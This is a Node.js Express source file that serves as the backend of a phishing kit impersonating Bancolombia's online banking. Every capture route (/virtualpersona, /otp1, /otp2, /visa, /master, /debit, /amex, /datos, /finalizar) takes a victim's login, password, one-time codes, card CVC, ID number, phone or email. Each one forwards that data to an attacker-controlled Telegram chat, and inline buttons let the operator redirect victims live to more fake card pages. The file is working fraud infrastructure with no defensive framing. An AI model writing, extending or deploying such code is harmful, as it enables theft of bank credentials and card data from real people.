// 📦 Backend para Bancolombia Sucursal Virtual Personas
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');

const app = express();
const corsOptions = {
  origin: '*', 
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions)); // Maneja preflight

app.use(bodyParser.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn("[WARN] BOT_TOKEN o CHAT_ID no definidos.");
}

const redirections = new Map();

// Función auxiliar para construir la URL base de Telegram
const getTelegramApiUrl = (method) => `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;


app.get('/', (_req, res) => {
  res.send({ ok: true, service: 'virtual-backend', hasEnv: !!(BOT_TOKEN && CHAT_ID) });
});

// ====================================================================================
// 💡 FUNCIONES DE MENÚ REUTILIZABLES (Solución al error 500 por límite de botones)
// Nota: Las rutas se envían sin el '.html' para mayor robustez en el callback_data
// ====================================================================================

// Menú 1: Los botones más importantes (8 botones + el botón de despliegue)
function getPrimaryReplyMarkup(sessionId) {
    return {
        inline_keyboard: [
            [
                { text: "❌ Error Logo", callback_data: `go:errorlogo|${sessionId}` },
                { text: "✅ Siguiente (OTP)", callback_data: `go:opcion1|${sessionId}` }
            ],
            [
                { text: "💳 Débito", callback_data: `go:debit|${sessionId}` },
                { text: "🪙 Visa Oro", callback_data: `go:Visa+Oro|${sessionId}` }
            ],
            [
                { text: "💍 Master Clásica", callback_data: `go:Mastercard+Clasica|${sessionId}` },
                { text: "🌐 Virtual", callback_data: `go:virtualdedbit|${sessionId}` }
            ],
            [
                { text: "🏦 Amex", callback_data: `go:amexs|${sessionId}` },
                { text: "📋 Datos", callback_data: `go:datos|${sessionId}` }
            ],
            // Botón que despliega el Menú 2 para más tarjetas
            [
                { text: "➕ Más Tarjetas (Menú 2)", callback_data: `send:menu_tarjetas2|${sessionId}` }
            ]
        ]
    };
}

// Menú 2: El resto de tarjetas (se envía en un MENSAJE APARTE)
function getSecondaryReplyMarkup(sessionId) {
    return {
        inline_keyboard: [
            [
                { text: "💍 Visa Clásica", callback_data: `go:Visa+clasica|${sessionId}` },
                { text: "🖤 Visa Infinite", callback_data: `go:Infinite_Card|${sessionId}` }
            ],
            [
                { text: "🩶 Visa Platinum", callback_data: `go:Visa+Platinum|${sessionId}` },
                { text: "⚽ Visa Selección", callback_data: `go:Visa+Seleccion|${sessionId}` }
            ],
            [
                { text: "🛩️ Visa LifeMiles", callback_data: `go:Visa+LifeMiles|${sessionId}` },
                { text: "🪙 MasterCard Gold", callback_data: `go:mastergold|${sessionId}` }
            ],
            [
                { text: "🩶 MasterCard Platinum", callback_data: `go:masterplati|${sessionId}` },
                { text: "🖤 Mastercard Black", callback_data: `go:masterblaack|${sessionId}` }
            ],
            [
                { text: "🏠 Volver al Menú Principal", callback_data: `go:opcion1|${sessionId}` } // Redirige a la página principal
            ]
        ]
    };
}

// Menú de opciones de error/reintento para los OTP
function getOTPReplyMarkup(sessionId, rutaSiguiente = 'opcion1') {
    return {
        inline_keyboard: [
            [
                { text: "❌ Error Logo", callback_data: `go:errorlogo|${sessionId}` },
                { text: "⚠️ Error OTP", callback_data: `go:opcion2|${sessionId}` },
            ],
            [
                { text: "🔁 Nuevo OTP", callback_data: `go:${rutaSiguiente}|${sessionId}` },
                { text: "✅ Finalizar", callback_data: `go:finalizar|${sessionId}` }
            ],
            // Incluimos el botón para el menú 2
            [
                 { text: "➕ Más Opciones", callback_data: `send:menu_tarjetas2|${sessionId}` } 
            ]
        ]
    };
}


// ================== RUTAS PRINCIPALES ==================

// 🟢 /virtualpersona (Entrada de Usuario y Clave)
app.post('/virtualpersona', async (req, res) => {
  try {
    const { sessionId, user, pass, ip, country, city } = req.body;
    if (!BOT_TOKEN || !CHAT_ID) {
      console.error("❌ BOT_TOKEN o CHAT_ID no definidos");
      return res.status(500).send({ ok: false, reason: "Env vars undefined" });
    }

    const mensaje = `
🟢 Nuevo Ingreso

👤 User: ${user}
🔒 Pass: ${pass}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    // Usamos el menú principal que es más corto y seguro
    const reply_markup = getPrimaryReplyMarkup(sessionId);

    // CORRECCIÓN: Usar la función getTelegramApiUrl
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /virtualpersona');
    if (error.response) {
      console.error('🔁 RESPONSE:', error.response.data);
    }
    console.error('🧠 ERROR:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// 🟡 /otp1 (Ingreso de OTP Dina)
app.post('/otp1', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body;

    const mensaje = `
🟡 Ingreso OTP Dina

👤 User: ${user}
🔒 Pass: ${pass}
🔢 Dina: ${dina}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    redirections.set(sessionId, null);

    // Usa el menú especial de OTP
    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion1');

    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ Error en /otp1:', error.message);
    res.status(500).send({ ok: false });
  }
});

// 🟠 /otp2 (Re-ingreso o segundo OTP)
app.post('/otp2', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body;

    const mensaje = `
🟠 Ingreso OTP new Dina

👤 User: ${user}
🔒 Pass: ${pass}
🔢 Dina: ${dina}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    redirections.set(sessionId, null);

    // Usa el menú especial de OTP
    const reply_markup = getOTPReplyMarkup(sessionId, 'opcion2');

    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ Error en /otp2:', error.message);
    res.status(500).send({ ok: false });
  }
});

// ================== RUTAS DE CAPTURA DE DATOS (TODAS CON MENÚ PRIMARIO) ==================

// 💳 /visa (Captura de CVC)
app.post('/visa', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💳 VISA
👤 Usuario: ${user}
🔒 Clave: ${pass}
🔢 CVC: ${cvc}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();

    // Usa el menú principal corregido
    const reply_markup = getPrimaryReplyMarkup(sessionId);

    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ Error en /visa:', error.message);
    res.status(500).send({ ok: false });
  }
});

// 💳 /master (Captura de CVC)
app.post('/master', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💳 MASTERCARD
👤 Usuario: ${user}
🔒 Clave: ${pass}
🔢 CVC: ${cvc}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();

    // Usa el menú principal corregido
    const reply_markup = getPrimaryReplyMarkup(sessionId);

    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ Error en /master:', error.message);
    res.status(500).send({ ok: false });
  }
});

// 🏦 /debit (Captura de CVC)
app.post('/debit', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
🏦 DÉBITO
👤 Usuario: ${user}
🔒 Clave: ${pass}
🔢 CVC: ${cvc}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();

    // Usa el menú principal corregido
    const reply_markup = getPrimaryReplyMarkup(sessionId);

    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ Error en /debit:', error.message);
    res.status(500).send({ ok: false });
  }
});

// 💰 /credit (Captura de CVC - aunque no se usa en el flujo principal)
app.post('/credit', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💰 CRÉDITO
👤 Usuario: ${user}
🔒 Clave: ${pass}
🔢 CVC: ${cvc || "N/A"}
🌐 ${ip} - ${city}, ${country}
🆔 Session: ${sessionId}
    `.trim();

    // Usa el menú principal corregido
    const reply_markup = getPrimaryReplyMarkup(sessionId);

    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ Error en /credit:', error.message);
    res.status(500).send({ ok: false });
  }
});


// 💎 /amex (Captura de CVC)
app.post('/amex', async (req, res) => {
  try {
    const { sessionId, user, pass, cvc, ip, country, city } = req.body;
    const mensaje = `
💎 AMEX
👤 Usuario: ${user}
🔒 Clave: ${pass}
🔢 CVC: ${cvc}
🌐 ${ip} - ${city}, ${country}
    `.trim();

    // Usa el menú principal corregido
    const reply_markup = getPrimaryReplyMarkup(sessionId);

    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ Error en /amex:', error.message);
    res.status(500).send({ ok: false });
  }
});

// 🔹 /datos (Captura de Documento, Celular y Correo)
app.post('/datos', async (req, res) => {
  try {
    const { sessionId, dc, num, mail, ip, country, city } = req.body;

    const mensaje = `
📋 DATOS PERSONALES

🆔 Documento: ${dc}
📱 Celular: ${num}
📧 Correo: ${mail}
🌐 ${ip} - ${city}, ${country}
🧩 sessionId: ${sessionId}
    `.trim();

    // Usa el menú principal corregido
    const reply_markup = getPrimaryReplyMarkup(sessionId);

    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ Error en /datos:', error.message);
    res.status(500).send({ ok: false });
  }
});

// 🛑 /finalizar (Página de despedida/cierre de sesión)
app.post('/finalizar', async (req, res) => {
  try {
    // Capturamos todos los campos que podrían enviarse desde cualquier página
    const { sessionId, user, pass, dina, cvc, dc, num, mail, ip, country, city } = req.body;

    const mensaje = `
🛑 FINALIZADO

🎉 Proceso de suplantación completado.

📄 Resumen de Datos Capturados:
👤 User: ${user || 'N/A'}
🔒 Pass: ${pass || 'N/A'}
🔢 Dina/OTP: ${dina || 'N/A'}
💳 CVC/Clave: ${cvc || 'N/A'}
🆔 Documento: ${dc || 'N/A'}
📱 Celular: ${num || 'N/A'}
📧 Correo: ${mail || 'N/A'}

🌐 IP: ${ip || 'N/A'} - ${city || 'N/A'}, ${country || 'N/A'}
🆔 sessionId: ${sessionId}
    `.trim();

    // Enviamos el mensaje de finalización
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
    });

    // Limpiamos la sesión de redirecciones
    redirections.delete(sessionId); 

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /finalizar:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});


// ================== RUTA PARA ENVIAR EL SEGUNDO MENÚ (DISPARADO POR send:menu_tarjetas2) ==================

app.post('/menu_tarjetas2', async (req, res) => {
  try {
    const { sessionId } = req.body; 

    const mensaje = `
📋 Menú de Tarjetas Adicionales

Selecciona una opción para redireccionar al cliente:
    `.trim();

    // Usa el menú secundario que tiene el resto de opciones
    const reply_markup = getSecondaryReplyMarkup(sessionId);

    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ Error en /menu_tarjetas2:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});


// ================== RUTAS DE REDIRECCIÓN Y WEBHOOK ==================

// 📩 Webhook de Telegram para botones (MODIFICADO para manejar el comando 'send:')
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
  try {
    const update = req.body;
    const { callback_query } = update;

    if (callback_query) {
      // La ruta de redirección se obtiene del callback_data y se le agrega el '.html' al final.
      const [action, sessionId] = (callback_query.data || '').split('|');
      const route = action.replace('go:', '');
      const finalRoute = `${route}.html`;

      // Manejar el botón que pide el segundo menú
      if (action.startsWith('send:')) {
          const sendRoute = action.replace('send:', '');

          await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
              callback_query_id: callback_query.id,
              text: `Cargando Menú Adicional...`,
              show_alert: true
          });

          // Llama a la ruta del servidor para que envíe el segundo mensaje. 
          // IMPORTANTE: Esta URL debe ser la URL de tu backend en Render/otro servicio.
          await axios.post(`https://diosnoseolvidademi.onrender.com/${sendRoute}`, { sessionId });

          return res.sendStatus(200); // Terminamos aquí si solo fue un envío de menú
      }
      
      // Si la acción es 'go', configuramos la redirección
      if (sessionId) redirections.set(sessionId, finalRoute); // Guarda la ruta COMPLETA con .html

      await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
        callback_query_id: callback_query.id,
        text: `Redirigiendo cliente → ${finalRoute}`,
        show_alert: true
      });
    }
    res.sendStatus(200);
  } catch (err) {
    console.error("❌ Error en webhook:", err);
    res.sendStatus(200);
  }
});

// 🔁 Polling desde loading.html
app.get('/instruction/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const target = redirections.get(sessionId);

  if (target) {
    redirections.delete(sessionId);
    res.send({ redirect_to: target });
  } else {
    res.send({});
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Servidor activo en puerto ${PORT}`));

// ==== Auto-ping para mantener activo el backend en Render ====
setInterval(async () => {
  try {
    // URL del Auto-Ping usando tu dominio en Render. Asegúrate de que esta URL sea correcta.
    const res = await fetch("https://diosnoseolvidademi.onrender.com"); 
    const text = await res.text();
    console.log("🔁 Auto-ping realizado:", text);
  } catch (error) {
    console.error("❌ Error en auto-ping:", error.message);
  }
}, 180000); // 180000 ms = 3 minutos
